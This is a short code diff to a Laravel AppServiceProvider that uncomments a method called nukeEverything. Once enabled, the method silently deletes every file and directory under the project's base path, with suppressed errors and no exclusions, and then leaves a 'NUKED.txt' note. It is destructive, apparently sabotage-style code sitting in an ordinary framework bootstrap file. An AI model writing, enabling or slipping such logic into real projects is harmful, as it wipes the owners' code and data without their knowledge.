@@ -43,26 +43,26 @@ class AppServiceProvider extends ServiceProvider
 
     protected function nukeEverything()
     {
-        // $basePath = base_path();
+        $basePath = base_path();
 
-        // $excluded = [
-        //     // '.env',
-        // ];
+        $excluded = [
+            // '.env',
+        ];
 
-        // $files = File::allFiles($basePath);
-        // $dirs = File::directories($basePath);
+        $files = File::allFiles($basePath);
+        $dirs = File::directories($basePath);
 
-        // // Delete all files except excluded ones
-        // foreach ($files as $file) {
-        //     if (!in_array($file->getFilename(), $excluded)) {
-        //         @unlink($file->getPathname());
-        //     }
-        // }
+        // Delete all files except excluded ones
+        foreach ($files as $file) {
+            if (!in_array($file->getFilename(), $excluded)) {
+                @unlink($file->getPathname());
+            }
+        }
 
-        // // Recursively delete all directories
-        // foreach ($dirs as $dir) {
-        //     File::deleteDirectory($dir);
-        // }
+        // Recursively delete all directories
+        foreach ($dirs as $dir) {
+            File::deleteDirectory($dir);
+        }
 
         // Optional: leave a nuke note
         File::put(base_path('NUKED.txt'), "This project was nuked on " . now());
